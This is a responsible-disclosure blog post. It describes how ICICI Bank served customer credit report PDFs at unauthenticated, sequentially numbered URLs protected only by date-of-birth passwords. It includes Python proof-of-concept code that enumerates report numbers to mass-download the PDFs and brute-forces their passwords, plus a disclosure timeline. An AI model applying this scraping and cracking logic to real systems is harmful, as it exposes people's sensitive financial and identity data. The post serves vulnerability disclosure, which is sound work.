---
layout: post
title: ICICI Bank Exposes Customer Credit Reports
subtitle: Improper Access Control
cover-img: /assets/img/2022_10_31/POCOutput.jpg
thumbnail-img: /assets/img/2022_10_31/SampleCreditReport.png
share-img: /assets/img/2022_10_31/POCOutput.jpg
tags: [server configuration, encrypted pdf, bruteforce]
---

For this blogpost, I will be deviating from my usual topic of malware analysis and talking about how an improper access control on a bank's server lead to exposure of its customers' credit reports. 

ICICI Bank is a leading bank and financial services company in India. It offers a wide range of banking products and financial services, including the ability to download CIBIL [1] credit reports. These credit reports contain sensitive information like 
* Date of Birth
* Income Tax ID Number (PAN)
* Universal ID Number
* Personal and Work Phone Numbers
* Personal/Home and Work Addresses 
* Associated Email Addresses
* Credit Score
* Past Credit History

The issue outlined in this post allowed anyone to download ICICI bank's customer credit reports from their server and access the Personally Identifiable Information (PII) within them.

As an ICICI bank customer, when you request for a credit report through its iMobile app [2], it performs the following two actions
1. Sends an email to your registered email address with an encrypted pdf attachment. The password for this pdf is the first four alphabets of the customer's name in lower case and year of birth
2. The app also opens the URL https://203.27.235.149:98/GetRpt.aspx?refno=REDACTED_NUMBER in the default browser, which downloads an encrypted pdf. The password for this pdf is the customer's date of birth in the format DDMMYYYY.

The second action is the root cause of this post. The URL provided allows for unauthenticated access to credit reports. Since the REDACTED_NUMBER is sequentially generated for every requested credit report, they can be downloaded by a simple script. This, coupled with the weak password, allows an attacker to download all the credit reports hosted by ICICI Bank, and bruteforce it offline. 

To further expand on how trivial, it is to bruteforce the password, assume that the youngest customer of ICICI bank is 15 years old, and the oldest is one hundred years old. This means the sample space is of the size 365*(100-15) = 31025. The maximum attempts required to crack the Credit Report's password is 31025. My 3.3GHz Ryzen 9 PC can perform 221.39 attempts per second single threaded. It will be able to crack a 50-year-old person's password in 57.7 seconds. The below image is an example of how quickly my proof-of-concept code was able to download and **crack my own** credit report.

![Proof of Concept Output](/assets/img/2022_10_31/POCOutput.jpg){: .mx-auto.d-block :}
<center><em>Figure 1: Proof of Concept Output</em></center>

# Proof of Concept

The complete PoC code was shared with ICICI bank, which I will not include in this post. This section contains only few sections of the code that I found interesting. I have replace sensitive values by "REDACTED"

The below code will iterate through the reference number query parameter in the URI and download a copy of the credit report and store it locally.


```
def download_credit_reports(vulnerable_icici_uri):
    successful_file_downloads = []
    reference_number_start = REDACTED
    reference_number_end = REDACTED
    query_param = {'refno': reference_number_start}
    while reference_number_start <= reference_number_end:
        try:
            response = requests.get(vulnerable_icici_uri, params=query_param)
            downloaded_filename = str(reference_number_start) + '.pdf'
            with open(downloaded_filename, 'wb') as f:
                f.write(response.content)
                successful_file_downloads.append(downloaded_filename)
                logger.info(f'Successfully downloaded the credit report {downloaded_filename} from the URL {response.url}')
        except requests.exceptions.RequestException as e:
            raise SystemExit(e)

        reference_number_start += 1

    return successful_file_downloads
```

The below section bruteforces the password required to decrypt the credit report. Knowing the exact format of the password and the limited sample space makes the whole operation trivial. 

```
def bruteforce_pdf_password(pdf_file_name):
    pdf_file_reader = PdfFileReader(pdf_file_name)

    # Calculate Performance Metrics
    attempt_count = 0
    start_time = time.time()

    baseline_end_age = 365 * 100  # 100 years is the max we will go
    baseline_start_age = 365 * 15  # 15 years is the min we will consider
    iteration_date = date.today() - timedelta(days=baseline_start_age)
    end_date = date.today() - timedelta(days=baseline_end_age)

    while iteration_date >= end_date:
        attempt_count += 1
        password = iteration_date.strftime("%d%m%Y")
        if decrypt_pdf(pdf_file_reader, pdf_file_name, password):
            logger.info(f'Bruteforced in {attempt_count} attempts and {round(time.time() - start_time, 2)} seconds')
            write_decrypted_pdf(pdf_file_reader, pdf_file_name)
            break

        iteration_date -= timedelta(days=1)
```

# ICICI Bank Correspondence

ICICI Bank does not have an official contact method to report security issues with their services. As a result, I had to find infosec employees in ICICI Bank through LinkedIn and contact them to report this issue. The only response I got was that the appropriate team has been engaged, but the issue was not fixed even after 6 months. 

During later investigation, I was able to identify that they moved to a newer endpoint - https://bureauoneprod.icicibank.com:8443/GetRpt.aspx?refno=REDACTED_NUMBER. I reached out to ICICI bank again and got the same response as before.

As a result, I raised a complaint with Reserve Bank of India Ombudsman about this issue. Within 10 days of this complaint, the issue was fixed, and I received the following response 

![ICICI Bank Response](/assets/img/2022_10_31/ICICIBankResponse.png){: .mx-auto.d-block :}
<center><em>Figure 2: ICICI Bank Response</em></center>


# Disclosure Timeline
1. 2022-04-16 - Identified that ICICI Bank's customer credit reports can be accessed by through unauthenticated requests.
2. 2022-04-16 - Due to lack of reporting mechanisms at ICICI for security issues, I reached out to a "Threat Intelligence Analyst" and a "Chief Manager" in their InfoSec organization through LinkedIn.
3. 2022-04-18 - Received a response from the "Chief Manager" and sent them an email with contents of this blogpost along with the PoC code. 
4. 2022-04-25 - Followed up with the "Chief Manager" on a resolution. 
5. 2022-05-08 - Added the Threat Intelligence Analyst previously mentioned to this email thread and requested for an update on the resolution. 
6. 2022-05-09 - Received a response on the appropriate team being notified for response. 
7. 2022-10-01 - Reached out again to the ICICI bank contacts about the issue not being fixed. Got the same response as above.
8. 2022-10-07 - Raised a complaint with Reserve Bank of India Ombudsman through their portal. 
9. 2022-10-17 - Received a response for the above complaint from ICICI Bank, confirming the fix.



# References
1. [https://www.cibil.com/consumer](https://www.cibil.com/consumer)
2. [https://www.icicibank.com/imobilecampaign/index.html](https://www.icicibank.com/imobilecampaign/index.html)

